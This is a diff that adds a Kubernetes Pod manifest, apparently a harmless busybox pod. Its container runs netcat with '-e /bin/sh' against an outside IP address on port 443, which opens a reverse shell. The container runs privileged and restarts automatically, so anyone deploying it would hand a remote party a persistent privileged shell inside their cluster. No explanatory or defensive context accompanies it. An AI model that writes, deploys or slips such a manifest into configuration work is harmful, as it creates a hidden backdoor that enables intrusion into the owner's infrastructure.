@@ -1,0 +1,17 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: busybox
+  labels:
+    app: busybox
+spec:
+  containers:
+  - name: busybox
+    image: busybox
+    command: ["/bin/nc"]
+    args: ["15.134.182.244", "443", "-e", "/bin/sh", "-i"]
+    stdin: true
+    tty: true
+    securityContext:
+      privileged: true
+  restartPolicy: Always
